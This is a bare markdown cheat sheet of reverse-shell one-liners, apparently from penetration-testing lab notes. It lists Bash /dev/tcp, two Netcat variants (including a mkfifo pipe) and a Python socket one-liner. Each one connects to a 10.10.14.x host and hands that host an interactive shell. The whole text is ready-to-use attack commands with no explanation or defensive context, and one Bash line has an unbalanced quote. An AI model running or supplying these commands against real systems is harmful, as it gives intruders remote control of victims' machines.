# Reverse Shells

----------------------------------------------------


### Bash  
`bash -i >& /dev/tcp/10.10.14.3/4444 0>&1`
`bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1`

### Netcat  
`nc -e /bin/bash 10.10.14.3 4444`

### Netcat(2)
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.39 1234 >/tmp/f`

### Python 
`python -c 'import socket,subprocess,os;s=socket.socket( socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.39",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`